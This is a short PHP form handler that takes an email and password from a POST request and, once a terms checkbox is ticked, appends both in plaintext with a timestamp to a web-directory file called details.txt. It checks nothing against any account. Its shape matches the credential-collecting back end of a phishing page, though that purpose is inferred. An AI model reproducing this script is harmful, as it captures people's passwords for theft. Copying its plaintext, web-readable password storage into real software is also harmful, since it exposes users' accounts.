<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Sanitize and validate input data
    $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
    $password = filter_var($_POST['password'], FILTER_SANITIZE_STRING);
    $terms = isset($_POST['terms']) ? true : false;

    if ($terms) {
        // Define the file path
        $file = 'details.txt';

        // Open the file in append mode
        $file_handle = fopen($file, 'a');

        if ($file_handle) {
            // Write the login details to the file
            fwrite($file_handle, "Email: " . $email . "\n");
            fwrite($file_handle, "Password: " . $password . "\n");
            fwrite($file_handle, "Timestamp: " . date('Y-m-d H:i:s') . "\n\n");

            // Close the file
            fclose($file_handle);

            echo "Login details saved successfully.";
        } else {
            echo "Error opening the file.";
        }
    } else {
        echo "You must accept the terms of use.";
    }
} else {
    echo "Invalid request method.";
}
?>
